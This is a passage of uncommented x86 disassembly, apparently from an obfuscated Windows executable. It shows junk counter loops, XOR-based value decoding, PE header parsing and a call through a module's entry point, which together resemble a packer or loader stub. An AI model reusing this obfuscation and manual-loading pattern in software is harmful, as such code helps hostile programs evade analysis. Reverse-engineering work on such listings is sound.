  40885f:	mov    DWORD PTR [ebp-0x28],eax
  408862:	xor    eax,eax
  408864:	add    eax,DWORD PTR ds:0x43c8f8
  40886a:	mov    ebx,DWORD PTR ds:0x43c904
  408870:	sub    eax,ebx
  408872:	add    eax,DWORD PTR [eax+ebx*1]
  408875:	mov    eax,DWORD PTR [ebp-0x20]
  408878:	mov    DWORD PTR [ebp-0x1c],eax
  40887b:	mov    eax,ds:0x43c1a0
  408880:	and    DWORD PTR ds:0x43fbfc,0x0
  40888a:	mov    ebx,DWORD PTR ds:0x43fbfc
  408890:	inc    ebx
  408891:	mov    DWORD PTR ds:0x43fbfc,ebx
  408897:	cmp    DWORD PTR ds:0x43fbfc,0x21
  40889e:	jne    0x4088b5
  4088a4:	push   0x32f9
  4088a9:	push   DWORD PTR [ebp-0x20]
  4088ac:	push   DWORD PTR [ebp-0x18]
  4088af:	call   DWORD PTR ds:0x43c5d4
  4088b5:	cmp    DWORD PTR ds:0x43fbfc,0x13
  4088bc:	jb     0x40888a
  4088c2:	mov    DWORD PTR ds:0x4427c0,0x1c
  4088cc:	cmp    DWORD PTR ds:0x4427c0,0x0
  4088d3:	je     0x408985
  4088d9:	cmp    DWORD PTR ds:0x4427c0,0xe
  4088e0:	jne    0x4088ef
  4088e6:	push   DWORD PTR [ebp-0x24]
  4088e9:	call   DWORD PTR ds:0x43c5d8
  4088ef:	cmp    DWORD PTR ds:0x4427c0,0xf
  4088f6:	jne    0x40890b
  4088fc:	xor    edx,edx
  4088fe:	xor    edx,DWORD PTR ds:0x4427c0
  408904:	dec    edx
  408905:	mov    DWORD PTR ds:0x4427c0,edx
  40890b:	mov    edx,DWORD PTR ds:0x4427c0
  408911:	dec    edx
  408912:	mov    DWORD PTR ds:0x4427c0,edx
  408918:	jmp    0x4088cc
  40891d:	and    DWORD PTR ds:0x4105bf,0x0
  408927:	jmp    0x40893b
  40892c:	xor    edx,edx
  40892e:	xor    edx,DWORD PTR ds:0x4105bf
  408934:	inc    edx
  408935:	mov    DWORD PTR ds:0x4105bf,edx
  40893b:	cmp    DWORD PTR ds:0x4105bf,0x11
  408942:	jae    0x408985
  408948:	cmp    DWORD PTR ds:0x4105bf,0x7
  40894f:	jne    0x40895e
  408955:	push   DWORD PTR [ebp-0xc]
  408958:	call   DWORD PTR ds:0x43c874
  40895e:	cmp    DWORD PTR ds:0x4105bf,0x6
  408965:	jne    0x40897a
  40896b:	xor    edx,edx
  40896d:	or     edx,DWORD PTR ds:0x4105bf
  408973:	inc    edx
  408974:	mov    DWORD PTR ds:0x4105bf,edx
  40897a:	jmp    0x40892c
  40897f:	xor    DWORD PTR ds:0x43fc00,ebx
  408985:	mov    eax,DWORD PTR [eax+0x198]
  40898b:	mov    DWORD PTR [ebp-0x8],eax
  40898e:	or     DWORD PTR ds:0x43fbfc,0xc15
  408998:	mov    eax,DWORD PTR [ebp-0x1c]
  40899b:	mov    edx,DWORD PTR [ebp-0x8]
  40899e:	xor    ebx,0x1805
  4089a4:	xor    eax,esi
  4089a6:	dec    ebx
  4089a7:	add    eax,edi
  4089a9:	sbb    ebx,DWORD PTR ds:0x4105cf
  4089af:	mov    DWORD PTR [edx],eax
  4089b1:	add    ebx,DWORD PTR ds:0x4427ac
  4089b7:	lea    eax,[ebp-0x10]
  4089ba:	dec    ebx
  4089bb:	mov    DWORD PTR [ebp-0x34],eax
  4089be:	and    DWORD PTR ds:0x4105d7,0x0
  4089c8:	jmp    0x4089db
  4089cd:	xor    eax,eax
  4089cf:	or     eax,DWORD PTR ds:0x4105d7
  4089d5:	inc    eax
  4089d6:	mov    ds:0x4105d7,eax
  4089db:	cmp    DWORD PTR ds:0x4105d7,0x13
  4089e2:	jae    0x408a35
  4089e8:	cmp    DWORD PTR ds:0x4105d7,0x6
  4089ef:	jne    0x408a0d
  4089f5:	push   0x1b4e
  4089fa:	push   0x76a9
  4089ff:	push   DWORD PTR [ebp-0x1c]
  408a02:	push   0x886b
  408a07:	call   DWORD PTR ds:0x43c878
  408a0d:	cmp    DWORD PTR ds:0x4105d7,0x5
  408a14:	jne    0x408a25
  408a1a:	mov    eax,ds:0x4105d7
  408a1f:	inc    eax
  408a20:	mov    ds:0x4105d7,eax
  408a25:	jmp    0x4089cd
  408a2a:	mov    eax,ds:0x4427b4
  408a2f:	and    DWORD PTR ds:0x41340e,eax
  408a35:	mov    eax,DWORD PTR [ebp-0x1c]
  408a38:	adc    edx,0x330f
  408a3e:	mov    edx,DWORD PTR [ebp-0x34]
  408a41:	sub    DWORD PTR ds:0x4105cb,ebx
  408a47:	xor    eax,esi
  408a49:	mov    DWORD PTR ds:0x43fbd8,0x18
  408a53:	cmp    DWORD PTR ds:0x43fbd8,0x0
  408a5a:	je     0x408b05
  408a60:	cmp    DWORD PTR ds:0x43fbd8,0x2
  408a67:	jne    0x408a82
  408a6d:	push   DWORD PTR [ebp-0x28]
  408a70:	push   DWORD PTR [ebp-0x20]
  408a73:	push   DWORD PTR [ebp-0x10]
  408a76:	push   DWORD PTR [ebp-0x1c]
  408a79:	push   DWORD PTR [ebp-0x28]
  408a7c:	call   DWORD PTR ds:0x43c5dc
  408a82:	cmp    DWORD PTR ds:0x43fbd8,0x3
  408a89:	jne    0x408a9e
  408a8f:	xor    ebx,ebx
  408a91:	xor    ebx,DWORD PTR ds:0x43fbd8
  408a97:	dec    ebx
  408a98:	mov    DWORD PTR ds:0x43fbd8,ebx
  408a9e:	xor    ebx,ebx
  408aa0:	add    ebx,DWORD PTR ds:0x43fbd8
  408aa6:	dec    ebx
  408aa7:	mov    DWORD PTR ds:0x43fbd8,ebx
  408aad:	jmp    0x408a53
  408ab2:	and    DWORD PTR ds:0x41340a,0x0
  408abc:	jmp    0x408ace
  408ac1:	mov    ebx,DWORD PTR ds:0x41340a
  408ac7:	inc    ebx
  408ac8:	mov    DWORD PTR ds:0x41340a,ebx
  408ace:	cmp    DWORD PTR ds:0x41340a,0x10
  408ad5:	jae    0x408b05
  408adb:	cmp    DWORD PTR ds:0x41340a,0x19
  408ae2:	jne    0x408af3
  408ae8:	push   0x82d5
  408aed:	call   DWORD PTR ds:0x43c5e0
  408af3:	jmp    0x408ac1
  408af8:	movzx  ebx,WORD PTR ds:0x4105d7
  408aff:	and    DWORD PTR ds:0x43fc00,ebx
  408b05:	add    eax,edi
  408b07:	adc    DWORD PTR ds:0x413416,0x6c9f
  408b11:	mov    DWORD PTR [edx],eax
  408b13:	mov    DWORD PTR [ebp-0x2c],ecx
  408b16:	lea    eax,[ebp-0x2c]
  408b19:	or     ebx,ebx
  408b1b:	mov    DWORD PTR [ebp-0x14],eax
  408b1e:	add    ebx,eax
  408b20:	mov    eax,DWORD PTR [ebp-0x2c]
  408b23:	sub    ebx,0x4e67
  408b29:	mov    ecx,DWORD PTR [ebp-0x14]
  408b2c:	xor    eax,esi
  408b2e:	adc    ebx,0x2698
  408b34:	add    eax,0x32729e
  408b39:	and    DWORD PTR ds:0x41341e,0x0
  408b43:	mov    ebx,DWORD PTR ds:0x41341e
  408b49:	inc    ebx
  408b4a:	mov    DWORD PTR ds:0x41341e,ebx
  408b50:	cmp    DWORD PTR ds:0x41341e,0xb
  408b57:	jne    0x408b68
  408b5d:	push   0x4106f0
  408b62:	call   DWORD PTR ds:0x43c5e4
  408b68:	cmp    DWORD PTR ds:0x41341e,0xa
  408b6f:	jne    0x408b82
  408b75:	mov    ebx,DWORD PTR ds:0x41341e
  408b7b:	inc    ebx
  408b7c:	mov    DWORD PTR ds:0x41341e,ebx
  408b82:	cmp    DWORD PTR ds:0x41341e,0x19
  408b89:	jb     0x408b43
  408b8f:	adc    ebx,DWORD PTR ds:0x4105cb
  408b95:	mov    DWORD PTR [ecx],eax
  408b97:	sub    DWORD PTR ds:0x4427b4,0x6b19
  408ba1:	mov    eax,ds:0x43c274
  408ba6:	sbb    ebx,0x4548
  408bac:	mov    DWORD PTR [ebp-0x24],0x8e12febe
  408bb3:	xor    DWORD PTR ds:0x43fbf0,edx
  408bb9:	mov    eax,DWORD PTR [eax]
  408bbb:	xor    DWORD PTR ds:0x4427a8,ebx
  408bc1:	mov    cx,WORD PTR [ebp-0x10]
  408bc5:	movzx  ecx,cx
  408bc8:	xor    ebx,DWORD PTR ds:0x4105d7
  408bce:	add    ecx,DWORD PTR [eax]
  408bd0:	mov    DWORD PTR [ebp-0x40],0xf89c8531
  408bd7:	mov    ebx,DWORD PTR ds:0x43fbec
  408bdd:	sub    DWORD PTR ds:0x4427b8,ebx
  408be3:	mov    DWORD PTR [ebp-0x14],ecx
  408be6:	xor    ebx,ebx
  408be8:	mov    ebx,0x5a3fc9e
  408bed:	and    DWORD PTR ds:0x43fbe4,0x0
  408bf7:	mov    ecx,DWORD PTR ds:0x43fbe4
  408bfd:	inc    ecx
  408bfe:	mov    DWORD PTR ds:0x43fbe4,ecx
  408c04:	cmp    DWORD PTR ds:0x43fbe4,0x7
  408c0b:	jne    0x408c36
  408c11:	push   0x7083
  408c16:	push   0x1db3
  408c1b:	push   0x7eea
  408c20:	push   0x43fbdc
  408c25:	push   DWORD PTR [ebp-0x14]
  408c28:	push   DWORD PTR [ebp-0x24]
  408c2b:	push   0x41071f
  408c30:	call   DWORD PTR ds:0x43c87c
  408c36:	cmp    DWORD PTR ds:0x43fbe4,0x6
  408c3d:	jne    0x408c50
  408c43:	mov    ecx,DWORD PTR ds:0x43fbe4
  408c49:	inc    ecx
  408c4a:	mov    DWORD PTR ds:0x43fbe4,ecx
  408c50:	cmp    DWORD PTR ds:0x43fbe4,0x10
  408c57:	jb     0x408bf7
  408c5d:	mov    eax,DWORD PTR [ebp-0x1c]
  408c60:	mov    ecx,DWORD PTR [ebp-0x8]
  408c63:	xor    eax,esi
  408c65:	add    eax,edi
  408c67:	mov    DWORD PTR ds:0x4105d7,0x128d
  408c71:	cmp    DWORD PTR [ecx],eax
  408c73:	mov    DWORD PTR ds:0x41341a,0x2c74
  408c7d:	jne    0x408de6
  408c83:	movzx  eax,BYTE PTR ds:0x4105c7
  408c8a:	adc    eax,DWORD PTR ds:0x4105d3
  408c90:	mov    ds:0x4105c7,eax
  408c95:	mov    eax,DWORD PTR [ebp-0x1c]
  408c98:	mov    ecx,DWORD PTR [ebp-0x14]
  408c9b:	or     DWORD PTR ds:0x44537c,0x445378
  408ca5:	xor    eax,esi
  408ca7:	or     DWORD PTR ds:0x43fbe0,0x445380
  408cb1:	add    eax,edi
  408cb3:	mov    DWORD PTR ds:0x43fbf4,0x2417
  408cbd:	cmp    DWORD PTR [ecx],eax
  408cbf:	jne    0x408d21
  408cc5:	dec    edx
  408cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  408cc9:	sbb    DWORD PTR ds:0x44537c,0x7bb6
  408cd3:	mov    ecx,DWORD PTR [ebp-0x34]
  408cd6:	adc    DWORD PTR ds:0x43fbe8,ecx
  408cdc:	xor    eax,esi
  408cde:	xor    DWORD PTR ds:0x445378,0x6611
  408ce8:	add    eax,edi
  408cea:	movzx  edx,WORD PTR ds:0x413406
  408cf1:	sbb    DWORD PTR ds:0x41340e,edx
  408cf7:	mov    DWORD PTR [ecx],eax
  408cf9:	dec    ecx
  408cfa:	mov    eax,DWORD PTR [ebp-0x34]
  408cfd:	mov    ecx,DWORD PTR [ebp-0x40]
  408d00:	sbb    edx,DWORD PTR ds:0x445378
  408d06:	xor    ecx,esi
  408d08:	adc    edx,DWORD PTR ds:0x43fc00
  408d0e:	mov    edx,0xffcd8d62
  408d13:	sbb    DWORD PTR ds:0x43fbdc,0x43fbd8
  408d1d:	sub    edx,ecx
  408d1f:	add    DWORD PTR [eax],edx
  408d21:	mov    DWORD PTR ds:0x4105c7,0x19
  408d2b:	cmp    DWORD PTR ds:0x4105c7,0x0
  408d32:	je     0x408d8e
  408d38:	cmp    DWORD PTR ds:0x4105c7,0x5
  408d3f:	jne    0x408d63
  408d45:	push   DWORD PTR [ebp-0x1c]
  408d48:	push   0x2684
  408d4d:	push   DWORD PTR [ebp-0x18]
  408d50:	push   DWORD PTR [ebp-0x28]
  408d53:	push   0x71f6
  408d58:	push   0x2f24
  408d5d:	call   DWORD PTR ds:0x43c880
  408d63:	cmp    DWORD PTR ds:0x4105c7,0x6
  408d6a:	jne    0x408d7b
  408d70:	mov    eax,ds:0x4105c7
  408d75:	dec    eax
  408d76:	mov    ds:0x4105c7,eax
  408d7b:	xor    eax,eax
  408d7d:	or     eax,DWORD PTR ds:0x4105c7
  408d83:	dec    eax
  408d84:	mov    ds:0x4105c7,eax
  408d89:	jmp    0x408d2b
  408d8e:	mov    eax,ds:0x43c274
  408d93:	mov    eax,DWORD PTR [eax]
  408d95:	mov    cx,WORD PTR [ebp-0x10]
  408d99:	movzx  ecx,cx
  408d9c:	add    ecx,DWORD PTR [eax]
  408d9e:	mov    DWORD PTR [ebp-0x14],ecx
  408da1:	mov    eax,DWORD PTR [ebp-0x28]
  408da4:	mov    ecx,DWORD PTR [ebp-0x28]
  408da7:	xor    eax,esi
  408da9:	lea    eax,[eax+eax*1+0x32729e]
  408db0:	xor    ecx,esi
  408db2:	sub    ecx,eax
  408db4:	mov    ax,WORD PTR [ebp-0x10]
  408db8:	movzx  eax,ax
  408dbb:	cmp    eax,ecx
  408dbd:	mov    eax,DWORD PTR [ebp-0x40]
  408dc0:	movzx  ecx,WORD PTR [ebp-0x10]
  408dc4:	jg     0x408dd9
  408dca:	xor    eax,esi
  408dcc:	sub    ecx,eax
  408dce:	sub    ecx,edi
  408dd0:	mov    WORD PTR [ebp-0x10],cx
  408dd4:	jmp    0x408de6
  408dd9:	xor    eax,esi
  408ddb:	lea    eax,[eax+ecx*1+0x32729e]
  408de2:	mov    WORD PTR [ebp-0x10],ax
  408de6:	mov    ecx,DWORD PTR [ebp-0x24]
  408de9:	mov    eax,0x8e12febe
  408dee:	cmp    ecx,eax
  408df0:	je     0x408e04
  408df6:	mov    eax,DWORD PTR [ebp-0x8]
  408df9:	mov    DWORD PTR [eax],0x60341e8d
  408dff:	jmp    0x40902a
  408e04:	mov    ecx,DWORD PTR [ebp-0x24]
  408e07:	cmp    ecx,0x5142ddbc
  408e0d:	jne    0x408e85
  408e13:	mov    eax,DWORD PTR [ebp-0x8]
  408e16:	mov    DWORD PTR [eax],0x4214febc
  408e1c:	mov    eax,DWORD PTR [ebp-0x8]
  408e1f:	mov    DWORD PTR [ebp-0xc],eax
  408e22:	mov    eax,DWORD PTR [ebp-0x28]
  408e25:	mov    eax,DWORD PTR [ebp-0x1c]
  408e28:	mov    DWORD PTR [ebp-0x3c],ebx
  408e2b:	mov    eax,DWORD PTR [ebp-0x3c]
  408e2e:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408e35:	cmp    eax,ebx
  408e37:	jne    0x40902a
  408e3d:	mov    ax,WORD PTR [ebp-0x4]
  408e41:	mov    ecx,0x8a42
  408e46:	xor    ax,cx
  408e49:	mov    ecx,0x3b08
  408e4e:	add    ax,cx
  408e51:	mov    ecx,DWORD PTR [ebp-0xc]
  408e54:	movzx  eax,ax
  408e57:	not    eax
  408e59:	and    eax,DWORD PTR [ecx]
  408e5b:	mov    ecx,DWORD PTR [ebp-0xc]
  408e5e:	mov    DWORD PTR [ecx],eax
  408e60:	jmp    0x408e6c
  408e65:	xor    DWORD PTR [ebp-0x3c],0xe149ebe
  408e6c:	mov    ax,WORD PTR [ebp-0x4]
  408e70:	push   DWORD PTR [ebp-0xc]
  408e73:	call   0x407112
  408e78:	test   eax,eax
  408e7a:	je     0x408e65
  408e80:	jmp    0x40902a
  408e85:	mov    ecx,DWORD PTR [ebp-0x24]
  408e88:	cmp    ecx,0x1443fcbd
  408e8e:	jne    0x408ea2
  408e94:	mov    eax,DWORD PTR [ebp-0x8]
  408e97:	mov    DWORD PTR [eax],0x60062d8f
  408e9d:	jmp    0x40902a
  408ea2:	mov    ecx,DWORD PTR [ebp-0x24]
  408ea5:	cmp    ecx,eax
  408ea7:	jne    0x408faf
  408ead:	mov    eax,DWORD PTR [ebp-0x1c]
  408eb0:	mov    ecx,DWORD PTR [ebp-0x8]
  408eb3:	xor    eax,esi
  408eb5:	add    eax,edi
  408eb7:	cmp    DWORD PTR [ecx],eax
  408eb9:	je     0x408f3c
  408ebf:	mov    ecx,DWORD PTR [ebp-0x2c]
  408ec2:	mov    eax,DWORD PTR [ebp-0x8]
  408ec5:	mov    eax,DWORD PTR [eax]
  408ec7:	mov    eax,DWORD PTR [eax+0x3c]
  408eca:	lea    ecx,[ecx*8+0x78]
  408ed1:	add    eax,ecx
  408ed3:	mov    ecx,DWORD PTR [ebp-0x8]
  408ed6:	mov    ecx,DWORD PTR [ecx]
  408ed8:	mov    eax,DWORD PTR [eax+ecx*1]
  408edb:	mov    DWORD PTR [ebp-0x4],eax
  408ede:	mov    eax,DWORD PTR [ebp-0x1c]
  408ee1:	xor    eax,esi
  408ee3:	add    eax,edi
  408ee5:	mov    DWORD PTR [ebp-0xc],eax
  408ee8:	mov    eax,DWORD PTR [ebp-0x1c]
  408eeb:	mov    ecx,DWORD PTR [ebp-0x4]
  408eee:	xor    eax,esi
  408ef0:	add    eax,edi
  408ef2:	cmp    ecx,eax
  408ef4:	je     0x40902a
  408efa:	mov    eax,DWORD PTR [ebp-0x8]
  408efd:	mov    ecx,DWORD PTR [ebp-0x4]
  408f00:	add    ecx,DWORD PTR [eax]
  408f02:	mov    DWORD PTR [ebp-0xc],ecx
  408f05:	mov    eax,DWORD PTR [ebp-0xc]
  408f08:	mov    ecx,DWORD PTR [ebp-0x8]
  408f0b:	mov    eax,DWORD PTR [eax+0xc]
  408f0e:	mov    ecx,DWORD PTR [ecx]
  408f10:	mov    al,BYTE PTR [eax+ecx*1]
  408f13:	add    al,0x35
  408f15:	xor    al,0x49
  408f17:	cmp    al,0xc9
  408f19:	je     0x408f30
  408f1f:	mov    eax,DWORD PTR [ebp-0x1c]
  408f22:	mov    ecx,DWORD PTR [ebp-0x8]
  408f25:	xor    eax,esi
  408f27:	add    eax,edi
  408f29:	mov    DWORD PTR [ecx],eax
  408f2b:	jmp    0x40902a
  408f30:	xor    DWORD PTR [ebp-0x24],0x5fd8f
  408f37:	jmp    0x40902a
  408f3c:	mov    eax,DWORD PTR [ebp-0x8]
  408f3f:	mov    ecx,DWORD PTR [ebp-0x14]
  408f42:	mov    ecx,DWORD PTR [ecx]
  408f44:	mov    DWORD PTR [eax],ecx
  408f46:	mov    eax,DWORD PTR [ebp-0x8]
  408f49:	mov    DWORD PTR [ebp-0xc],eax
  408f4c:	mov    eax,DWORD PTR [ebp-0x28]
  408f4f:	mov    eax,DWORD PTR [ebp-0x1c]
  408f52:	mov    DWORD PTR [ebp-0x44],ebx
  408f55:	mov    eax,DWORD PTR [ebp-0x44]
  408f58:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408f5f:	cmp    eax,ebx
  408f61:	jne    0x40902a
  408f67:	mov    ax,WORD PTR [ebp-0x4]
  408f6b:	mov    ecx,0x8a42
  408f70:	xor    ax,cx
  408f73:	mov    ecx,0x3b08
  408f78:	add    ax,cx
  408f7b:	mov    ecx,DWORD PTR [ebp-0xc]
  408f7e:	movzx  eax,ax
  408f81:	not    eax
  408f83:	and    eax,DWORD PTR [ecx]
  408f85:	mov    ecx,DWORD PTR [ebp-0xc]
  408f88:	mov    DWORD PTR [ecx],eax
  408f8a:	jmp    0x408f96
  408f8f:	xor    DWORD PTR [ebp-0x44],0xe149ebe
  408f96:	mov    ax,WORD PTR [ebp-0x4]
  408f9a:	push   DWORD PTR [ebp-0xc]
  408f9d:	call   0x407112
  408fa2:	test   eax,eax
  408fa4:	je     0x408f8f
  408faa:	jmp    0x40902a
  408faf:	mov    eax,DWORD PTR [ebp-0x24]
  408fb2:	cmp    eax,0x33450cad
  408fb7:	jne    0x40902a
  408fbd:	mov    eax,DWORD PTR [ebp-0x8]
  408fc0:	mov    DWORD PTR [eax],0x443dc9d
  408fc6:	mov    eax,DWORD PTR [ebp-0x8]
  408fc9:	mov    DWORD PTR [ebp-0xc],eax
  408fcc:	mov    eax,DWORD PTR [ebp-0x28]
  408fcf:	mov    eax,DWORD PTR [ebp-0x1c]
  408fd2:	mov    DWORD PTR [ebp-0x38],ebx
  408fd5:	mov    eax,DWORD PTR [ebp-0x38]
  408fd8:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408fdf:	cmp    eax,ebx
  408fe1:	jne    0x40902a
  408fe7:	mov    ax,WORD PTR [ebp-0x4]
  408feb:	mov    ecx,0x8a42
  408ff0:	xor    ax,cx
  408ff3:	mov    ecx,0x3b08
  408ff8:	add    ax,cx
  408ffb:	mov    ecx,DWORD PTR [ebp-0xc]
  408ffe:	movzx  eax,ax
  409001:	not    eax
  409003:	and    eax,DWORD PTR [ecx]
  409005:	mov    ecx,DWORD PTR [ebp-0xc]
  409008:	mov    DWORD PTR [ecx],eax
  40900a:	jmp    0x409016
  40900f:	xor    DWORD PTR [ebp-0x38],0xe149ebe
  409016:	mov    ax,WORD PTR [ebp-0x4]
  40901a:	push   DWORD PTR [ebp-0xc]
  40901d:	call   0x407112
  409022:	test   eax,eax
  409024:	je     0x40900f
  40902a:	mov    eax,DWORD PTR [ebp-0x24]
  40902d:	cmp    eax,0x8e12febe
  409032:	je     0x408bed
  409038:	mov    eax,DWORD PTR [ebp-0x8]
  40903b:	mov    eax,ds:0x43c1a0
  409040:	mov    eax,DWORD PTR [eax+0x18c]
  409046:	mov    eax,DWORD PTR [eax]
  409048:	mov    DWORD PTR [ebp-0x58],eax
  40904b:	mov    eax,0xf89c8531
  409050:	mov    DWORD PTR [ebp-0x14],eax
  409053:	mov    DWORD PTR [ebp-0x14],eax
  409056:	mov    DWORD PTR [ebp-0x14],eax
  409059:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  409060:	mov    DWORD PTR [ebp-0x4],eax
  409063:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  40906a:	mov    ebx,DWORD PTR [ebp-0x20]
  40906d:	xor    ebx,esi
  40906f:	add    ebx,edi
  409071:	jmp    0x4090ac
  409076:	mov    eax,DWORD PTR [ebp-0x18]
  409079:	xor    eax,esi
  40907b:	lea    eax,[eax+ebx*1+0x32729e]
  409082:	push   eax
  409083:	mov    eax,DWORD PTR [ebp-0x14]
  409086:	xor    eax,esi
  409088:	lea    eax,[ebp+eax*1+0x3272a6]
  40908f:	push   eax
  409090:	mov    eax,ds:0x43c1a0
  409095:	push   DWORD PTR [eax+0x1bc]
  40909b:	call   0x402c35
  4090a0:	mov    eax,DWORD PTR [ebp-0x18]
  4090a3:	xor    eax,esi
  4090a5:	lea    ebx,[ebx+eax*1+0x32729e]
  4090ac:	mov    eax,DWORD PTR [ebp-0x18]
  4090af:	mov    ecx,DWORD PTR [ebp-0x18]
  4090b2:	xor    ecx,esi
  4090b4:	xor    eax,esi
  4090b6:	add    eax,ecx
  4090b8:	mov    ecx,DWORD PTR [ebp-0x18]
  4090bb:	xor    ecx,esi
  4090bd:	lea    eax,[eax+ecx*1+0x9757da]
  4090c4:	cmp    ebx,eax
  4090c6:	jbe    0x409076
  4090cc:	mov    eax,DWORD PTR [ebp+0xc]
  4090cf:	mov    ds:0x43c024,eax
  4090d4:	mov    eax,DWORD PTR [ebp+0x10]
  4090d7:	mov    ds:0x43c278,eax
  4090dc:	mov    eax,ds:0x43c024
  4090e1:	mov    ecx,DWORD PTR [ebp-0x30]
  4090e4:	sub    eax,edi
  4090e6:	xor    eax,esi
  4090e8:	mov    DWORD PTR [ecx],eax
  4090ea:	mov    eax,DWORD PTR [ebp-0x4c]
  4090ed:	cmp    eax,0xf89c8534
  4090f2:	je     0x40914f
  4090f8:	mov    eax,DWORD PTR [ebp-0x20]
  4090fb:	mov    ecx,DWORD PTR [ebp-0x54]
  4090fe:	xor    eax,esi
  409100:	add    eax,edi
  409102:	cmp    eax,ecx
  409104:	je     0x40914f
  40910a:	mov    eax,ds:0x43c1a0
  40910f:	mov    eax,DWORD PTR [eax+0x194]
  409115:	mov    ecx,DWORD PTR [eax]
  409117:	mov    eax,DWORD PTR [ecx+0x3c]
  40911a:	push   DWORD PTR ds:0x43c278
  409120:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409124:	push   DWORD PTR ds:0x43c024
  40912a:	add    eax,ecx
  40912c:	mov    ecx,DWORD PTR ds:0x43c1a0
  409132:	mov    ecx,DWORD PTR [ecx+0x194]
  409138:	push   DWORD PTR [ecx]
  40913a:	call   eax
  40913c:	mov    ecx,DWORD PTR ds:0x43c1a0
  409142:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409148:	mov    DWORD PTR [ecx],eax
  40914a:	jmp    0x409276
  40914f:	mov    eax,DWORD PTR [ebp-0x20]
  409152:	mov    ecx,DWORD PTR [ebp-0x58]
  409155:	xor    eax,esi
  409157:	add    eax,edi
  409159:	cmp    eax,ecx
  40915b:	jne    0x409259
  409161:	mov    eax,DWORD PTR [ebp-0x20]
  409164:	xor    eax,esi
  409166:	add    eax,edi
  409168:	mov    ds:0x43c224,eax
  40916d:	mov    eax,DWORD PTR [ebp-0x20]
  409170:	xor    eax,esi
  409172:	add    eax,edi
  409174:	mov    ds:0x43c21c,eax
  409179:	mov    eax,DWORD PTR [ebp-0x18]
  40917c:	mov    DWORD PTR [ebp-0x14],eax
  40917f:	mov    eax,DWORD PTR [ebp-0x20]
  409182:	mov    DWORD PTR [ebp+0xc],eax
  409185:	mov    eax,DWORD PTR [ebp+0xc]
  409188:	xor    eax,esi
  40918a:	add    eax,edi
  40918c:	mov    DWORD PTR [ebp+0xc],eax
  40918f:	mov    eax,ds:0x43c020
  409194:	mov    eax,DWORD PTR [eax]
  409196:	mov    DWORD PTR [ebp+0xc],eax
  409199:	mov    eax,ds:0x43c228
  40919e:	mov    eax,DWORD PTR [eax]
  4091a0:	mov    DWORD PTR [ebp-0x30],eax
  4091a3:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  4091aa:	mov    eax,DWORD PTR [ebp+0x10]
  4091ad:	xor    eax,esi
  4091af:	add    eax,edi
  4091b1:	mov    DWORD PTR [ebp+0x10],eax
  4091b4:	mov    eax,ds:0x43c1a0
  4091b9:	mov    DWORD PTR [ebp+0x10],eax
  4091bc:	mov    eax,DWORD PTR [ebp+0xc]
  4091bf:	mov    DWORD PTR [ebp+0xc],eax
  4091c2:	mov    eax,DWORD PTR [ebp+0xc]
  4091c5:	push   0x4
  4091c7:	pop    ecx
  4091c8:	sub    ecx,eax
  4091ca:	add    ecx,DWORD PTR [ebp-0x30]
  4091cd:	mov    DWORD PTR [ebp-0x4],0xf89c85f5
  4091d4:	mov    DWORD PTR [ebp+0x10],ecx
  4091d7:	mov    DWORD PTR [ebp-0xa0],0xf89c8531
  4091e1:	mov    eax,DWORD PTR [ebp+0xc]
  4091e4:	mov    DWORD PTR [ebp-0x9c],eax
  4091ea:	mov    eax,DWORD PTR [ebp+0x10]
  4091ed:	mov    DWORD PTR [ebp-0x98],eax
  4091f3:	mov    eax,DWORD PTR [ebp-0x4]
  4091f6:	xor    eax,esi
  4091f8:	add    eax,edi
  4091fa:	mov    DWORD PTR [ebp-0x94],eax
  409200:	lea    eax,[ebp-0x5c]
  409203:	mov    DWORD PTR [ebp-0x90],eax
  409209:	mov    eax,DWORD PTR [ebp-0xa0]
  40920f:	xor    eax,esi
  409211:	add    eax,edi
  409213:	mov    DWORD PTR [ebp-0xa0],eax
  409219:	lea    eax,[ebp-0xa0]
  40921f:	push   eax
  409220:	mov    eax,DWORD PTR [ebp-0x14]
  409223:	xor    eax,esi
  409225:	add    eax,edi
  409227:	push   eax
  409228:	mov    eax,ds:0x43c1c0
  40922d:	push   0x43c116
  409232:	push   DWORD PTR [eax]
  409234:	call   0x40101c
  409239:	xor    esi,esi
  40923b:	mov    eax,DWORD PTR [ebp+0x10]
  40923e:	sub    eax,esi
  409240:	push   eax
  409241:	mov    eax,DWORD PTR [ebp+0xc]
  409244:	add    eax,esi
  409246:	push   eax
  409247:	call   0x40354e
  40924c:	inc    esi
  40924d:	cmp    esi,0x52
  409250:	jb     0x40923b
  409256:	mov    eax,DWORD PTR [ebp-0x14]
  409259:	call   0x405b6e
  40925e:	lea    eax,[ebp+0x4]
  409261:	mov    DWORD PTR [ebp-0x50],eax
  409264:	mov    eax,DWORD PTR [ebp-0x48]
  409267:	mov    eax,DWORD PTR [ebp-0x18]
  40926a:	push   DWORD PTR [ebp-0x20]
  40926d:	lea    eax,[ebp-0x50]
  409270:	push   eax
  409271:	call   0x40324f
  409276:	mov    eax,ds:0x43c1a0
  40927b:	push   0x4
  40927d:	add    eax,0x1cc
  409282:	push   eax
  409283:	lea    eax,[ebp-0x48]
  409286:	push   eax
  409287:	call   0x402c35
  40928c:	mov    eax,DWORD PTR [ebp-0x48]
  40928f:	mov    eax,DWORD PTR [eax]
  409291:	pop    edi
  409292:	pop    ebx
  409293:	pop    esi
  409294:	leave  
  409295:	ret    0xc
  409298:	push   ebp
  409299:	mov    ebp,esp
  40929b:	sub    esp,0x58
  40929e:	add    eax,ecx
  4092a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4092a3:	sub    eax,DWORD PTR ds:0x43fbe0
  4092a9:	mov    eax,0x8a42
  4092ae:	add    DWORD PTR ds:0x4105d3,0x41340e
  4092b8:	xor    ax,WORD PTR [ecx+0x20]
  4092bc:	and    DWORD PTR ds:0x43fbe8,0x0
  4092c6:	mov    ecx,DWORD PTR ds:0x43fbe8
  4092cc:	inc    ecx
  4092cd:	mov    DWORD PTR ds:0x43fbe8,ecx
  4092d3:	cmp    DWORD PTR ds:0x43fbe8,0x9
  4092da:	jne    0x4092f3
  4092e0:	push   DWORD PTR [ebp-0x28]
  4092e3:	push   0x43fbf4
